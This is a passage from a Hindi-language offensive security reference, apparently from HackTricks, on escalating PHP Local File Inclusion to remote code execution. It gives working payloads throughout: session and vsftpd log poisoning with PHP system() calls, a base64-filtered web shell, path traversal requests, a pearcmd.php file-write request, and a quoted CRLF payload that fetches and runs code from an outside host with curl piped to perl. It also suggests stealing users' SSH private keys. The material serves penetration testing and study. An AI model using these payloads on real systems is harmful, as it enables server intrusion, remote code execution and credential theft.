### PHP sessions के माध्यम से

जाँचें कि वेबसाइट PHP Session (PHPSESSID) का उपयोग करती है या नहीं
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP में ये sessions _/var/lib/php5/sess\\_\[PHPSESSID]\_ files में स्टोर होते हैं
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
cookie को `<?php system('cat /etc/passwd');?>` पर सेट करें
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
PHP session file को include करने के लिए LFI का उपयोग करें
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh के माध्यम से

यदि ssh सक्रिय है, तो यह जांचें कि कौन-सा user उपयोग हो रहा है (/proc/self/status & /etc/passwd) और **\<HOME>/.ssh/id_rsa** तक पहुँचने की कोशिश करें।

### **के जरिए** **vsftpd** _**logs**_

FTP server vsftpd के logs _**/var/log/vsftpd.log**_ में स्थित हैं। यदि Local File Inclusion (LFI) vulnerability मौजूद है और exposed vsftpd server तक पहुँच संभव है, तो निम्नलिखित कदम विचार में लिए जा सकते हैं:

1. लॉगिन प्रक्रिया के दौरान username field में PHP payload inject करें।
2. Injection के बाद LFI का उपयोग करके server logs को _**/var/log/vsftpd.log**_ से retrieve करें।

### php base64 filter (using base64) के माध्यम से

जैसा कि [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article में दिखाया गया है, PHP base64 filter Non-base64 को ignore कर देता है। आप इसका उपयोग file extension check bypass करने के लिए कर सकते हैं: यदि आप ऐसा base64 प्रदान करते हैं जो ".php" पर समाप्त होता है, तो यह "." को ignore कर देगा और base64 में "php" append कर देगा। यहाँ एक example payload है:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### के माध्यम से php filters (किसी फ़ाइल की आवश्यकता नहीं)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) समझाती है कि आप आउटपुट के रूप में **php filters to generate arbitrary content** का उपयोग कर सकते हैं। इसका मूलतः मतलब यह है कि आप include के लिए **generate arbitrary php code** बना सकते हैं, वह भी इसे किसी फ़ाइल में लिखने की आवश्यकता **without needing to write** के बिना।

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault के माध्यम से

**अपलोड करें** एक फ़ाइल जो `/tmp` में **अस्थायी** के रूप में स्टोर होगी, फिर उसी **अनुरोध** में एक **segmentation fault** ट्रिगर करें, और तब वह **अस्थायी फ़ाइल हटाई नहीं जाएगी** और आप उसे खोज सकते हैं।

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx temp file storage के माध्यम से

यदि आपको **Local File Inclusion** मिला है और फ्रंट में **Nginx** PHP चला रहा है तो आप निम्नलिखित तकनीक से RCE प्राप्त कर सकते हैं:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS के माध्यम से

यदि आपको **Local File Inclusion** मिला है भले ही आपकी **session न हो** और `session.auto_start` `Off` हो। यदि आप **`PHP_SESSION_UPLOAD_PROGRESS`** को **multipart POST** डेटा में प्रदान करते हैं, तो PHP आपके लिए session को **enable कर देगा**। आप इसका दुरुपयोग करके RCE प्राप्त कर सकते हैं:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows में temp file uploads के माध्यम से

यदि आपको **Local File Inclusion** मिला है और सर्वर **Windows** पर चल रहा है, तो आप RCE प्राप्त कर सकते हैं:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args के माध्यम से

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), स्क्रिप्ट `/usr/local/lib/phppearcmd.php` php docker images में डिफ़ॉल्ट रूप से मौजूद होती है। इसके अलावा, स्क्रिप्ट को URL के माध्यम से arguments पास करना संभव है क्योंकि संकेत दिया गया है कि यदि किसी URL param में `=` नहीं है, तो उसे argument के रूप में उपयोग किया जाना चाहिए। इसके अलावा देखें [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) और [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)।

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
निम्नलिखित CRLF vuln का दुरुपयोग RCE प्राप्त करने के लिए किया गया है ([**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) से):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() के माध्यम से (file_uploads = on)

यदि आपने **Local File Inclusion** पाया है और एक फ़ाइल जो **phpinfo()** दिखाती है जिसमें file_uploads = on है तो आप RCE प्राप्त कर सकते हैं:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure के माध्यम से

यदि आपने **Local File Inclusion** पाया है और आप टेम्प फ़ाइल का पाथ **can exfiltrate the path** कर सकते हैं BUT the **server** is **checking** if the **file to be included has PHP marks**, you can try to **bypass that check** with this **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce के माध्यम से

यदि आप LFI का दुरुपयोग करके **upload temporary files** कर सकते हैं और सर्वर PHP execution को **hang** कर सकते हैं, तो आप घंटों तक **brute force filenames during hours** करके टेम्प फ़ाइल खोज सकते हैं:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error तक

यदि आप किसी भी फ़ाइलों को शामिल करते हैं `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (आपको वही फ़ाइल उस त्रुटि को फेंकने के लिए 2 बार शामिल करनी होगी).

**मुझे नहीं पता यह कितना उपयोगी है पर हो सकता है।**\
_भले ही आप PHP Fatal Error पैदा कर दें, PHP द्वारा अपलोड की गई अस्थायी फ़ाइलें हटा दी जाती हैं._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## संदर्भ

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
